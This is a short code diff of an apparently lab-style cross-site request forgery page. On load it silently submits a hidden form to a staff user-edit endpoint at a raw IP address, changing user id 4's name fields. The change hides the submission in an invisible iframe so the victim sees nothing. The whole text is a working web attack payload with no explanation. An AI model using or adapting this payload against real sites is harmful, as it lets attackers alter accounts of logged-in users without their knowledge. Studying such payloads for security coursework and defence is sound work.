@@ -1,12 +1,12 @@
-<iframe name="votar" style="display:none;"></iframe>
-<form name="csrfForm" action="https://35.184.88.145/red/public/staff/users/edit.php?id=4" method="POST">
+<iframe name="invis" style="display:none;"></iframe>
+<form name="csrfForm" action="https://35.184.88.145/red/public/staff/users/edit.php?id=4" method="POST" target="invis">
  <input type="hidden" name="first_name" value="JaneCSRFSucceed">
  <input type="hidden" name="last_name" value="DoeCSRFSucceed">
  <input type="hidden" name="previous_password" value="">
  <input type="hidden" name="password" value="">
  <input type="hidden" name="confirm_password" value="">
  <input type="hidden" name="submit" value="Update">
- <input type="submit" value="Submit">
+ <input type="submit" value="submit">
 </form>
 <script>
  document.csrfForm.submit();
